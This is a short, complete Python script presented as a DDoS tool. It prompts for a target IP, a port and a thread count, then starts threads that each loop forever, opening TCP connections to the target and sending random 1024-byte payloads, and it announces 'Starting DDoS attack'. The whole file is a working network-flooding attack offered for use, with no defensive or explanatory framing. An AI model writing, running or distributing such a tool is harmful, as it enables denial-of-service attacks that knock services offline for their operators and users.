import socket
import random
import time
import threading

def ddos(target_ip, target_port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            payload = bytes(random._urandom(1024))
            s.send(payload)
            s.close()
        except Exception as e:
            print("Error:", e)

def start_ddos(target_ip, target_port, num_threads):
    for _ in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target_ip, target_port))
        thread.start()

def main():
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    num_threads = int(input("Enter the number of threads to use: "))
    
    print("Starting DDoS attack on", target_ip, "port", target_port)
    start_ddos(target_ip, target_port, num_threads)
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
